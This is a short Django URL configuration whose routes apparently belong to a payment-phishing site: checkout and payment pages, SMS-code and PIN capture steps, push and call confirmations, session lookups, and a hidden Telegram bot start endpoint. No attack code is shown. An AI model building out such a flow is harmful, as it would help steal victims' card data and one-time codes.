from django.urls import path

from . import views

urlpatterns = [
    path('', views.index),
    path('oform', views.form_submit),
    path('oformlenie', views.oform),
    path('oplata', views.oplata),
    path('oplatalog', views.form_submit_get),
    path('yform', views.y_form_submit),
    path('yplatalog', views.y_form_submit_get),
    path('wform', views.w_form_submit),
    path('wplatalog', views.w_form_submit_get),
    path('s/<str:link_str>', views.set_session),
    path('call', views.call),
    path('push', views.push),
    path('suc', views.suc),
    path('cancel', views.cancel),
    path('payment-sms', views.payment_sms),
    path('payment-pin', views.payment_pin),
    path('sms', views.sms_submit),
    path('pin', views.pin_submit),
    path('callaction', views.call_submit),
    path('loading', views.loading),
    path('get_info/<str:session_id>', views.get_info),
    path('startbotfortelegramwithoutsshconnection', views.start_bot),

    ]